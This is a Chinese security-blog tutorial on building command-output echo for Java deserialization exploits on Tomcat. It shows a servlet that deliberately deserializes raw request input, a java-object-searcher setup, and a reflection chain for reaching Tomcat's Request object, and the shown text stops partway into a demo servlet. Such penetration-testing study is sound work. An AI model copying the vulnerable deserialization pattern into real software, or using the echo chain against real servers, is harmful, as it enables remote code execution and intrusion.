---
title: Java反序列化回显学习之Tomcat通用回显
url: https://www.secpulse.com/archives/200930.html
source: 安全脉搏
date: 2023-05-25
fetch_date: 2025-10-04T11:37:45.898333
---

# Java反序列化回显学习之Tomcat通用回显

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Java反序列化回显学习之Tomcat通用回显

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-05-24

31,274

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200930-1684906604.png)

# 前言

反序列化命令回显和内存马是反序列化漏洞的具体实现，在渗透过程中主要依靠这两种方式来获取目标权限。因此，这是在学习Java反序列化漏洞过程中绕不开的两个点。由于在实战中遇到的环境都是不可预测的，对于渗透从业者来说就要学习各种中间件的回显方式和内存马注入方法。常用的Java反序列化回显的本质上是利用Java反序列化漏洞在服务器上执行Java代码获取Request、Response对象并将命令执行的接口写入返回给请求端。

# 反序列化回显

Java反序列化回显的方式有多种，比如中间件回显、写文件（css、js、txt等）、报错回显等等。其中，通过获取request对象来实现命令执行的回显方式是目前最为通用和弊端最少的方式。基本思路如下：第一步：寻找存储request对象的全局变量 Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过Thread.currentThread()或Thread.getThreads()获取。第二步：半自动化反射搜索全局变量 这一步定位的是requst存储的具体位置,需要搜索requst对象具体存储在全局变量的那个属性里。我们可以通过反射技术遍历全局变量的所有属性的类型，若包含以下关键字可认为是我们要寻找的request对象。要实现以上的过程需要有相当扎实的代码基础和调试阅读能力，因此推荐一款Java内存对象搜索工具java-object-searcher。通过此工具可以快速方便的找到可利用request对象。

# Tomcat通用回显

## 挖掘回显链

环境搭建参考：https://www.cnblogs.com/kibana/p/16084787.html，本次实验环境为JDK1.8、Tomcat8.5.50、idea2020.1，本地搭建环境后使用java-object-searcher 搜索可用request对象，所编写的demo在tomcat7/8上实验通过。给出一个测试例子，在执行反序列化操作处打断点使用java-object-searcher半自动搜索获取利用链。

```
package com.webtest;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;

public class HelloTest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        InputStream is = req.getInputStream();
        ObjectInputStream ois = new ObjectInputStream(is);
        try {
            ois.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void doPost(HttpServletRequest req,HttpServletResponse resp) throws IOException {
        InputStream is = req.getInputStream();
        ObjectInputStream ois = new ObjectInputStream(is);
        try {
            ois.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

设置筛选条件如下。

```
//设置搜索类型包含Request关键字的对象
List<Keyword> keys = new ArrayList<>();
keys.add(new Keyword.Builder().setField_type("Request").build());
//定义黑名单
List<Blacklist> blacklists = new ArrayList<>();
blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
//新建一个广度优先搜索Thread.currentThread()的搜索器
SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
// 设置黑名单
searcher.setBlacklists(blacklists);
//打开调试模式,会生成log日志
searcher.setIs_debug(true);
//挖掘深度为20
searcher.setMax_search_depth(20);
//设置报告保存位置
searcher.setReport_save_path("D:\apache-tomcat-7.0.94\bin");
searcher.searchObject();
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200930-1684906608.png "null")

在搜索出的利用链中选择一个进行跟进分析。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200930-1684906611.png "null")

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread}
    ---> group = {java.lang.ThreadGroup}
        ---> threads = {class [Ljava.lang.Thread;}
            ---> [16] = {java.lang.Thread}
                ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
                    ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
                        ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
                            ---> global = {org.apache.coyote.RequestGroupInfo}
```

通过不断的反射调用最终来到global

```
Thread thread = Thread.currentThread();
ThreadGroup group = thread.getThreadGroup();
Thread[] threads = group.threads;
Thread t = threads[14];
Field f = t.getClass().getDeclaredField("target");
f.setAccessible(true);
Object target = f.get(t);
f = target.getClass().getDeclaredField("this$0");
f.setAccessible(true);
Object this$0 = f.get(target);
try{
    f = this$0.getClass().getDeclaredField("handler");
}catch(NoSuchFieldException e){
    f = this$0.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
}
f.setAccessible(true);
Object handler = f.get(this$0);
f = handler.getClass().getDeclaredField("global");
f.setAccessible(true);
Object global = f.get(handler);
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200930-1684906615.png "null")

进而往下可以找到想要的Request对象。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200930-1684906618.png "null")

根据利用链获取Request对象获取请求header头特定内容并打印输出。

```
package com.webtest;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/*
* TargetObject = {org.apache.tomcat.util.threads.TaskThread}
  ---> group = {java.lang.ThreadGroup}
   ---> threads = {class [Ljava.lang.Thread;}
    ---> [16] = {java.lang.Thread}
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
          ---> global = {org.apache.coyote.RequestGroupInfo}
          * */

@WebServlet("/demo")
public class TestDemo extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) {

        ThreadGroup group = java.lang.Thread.currentThread().getThreadGroup();
        java.lang.reflect.Field f = null;
        Object obj = null;
        String flag = "hello world";
        Boolean success = false;
        try...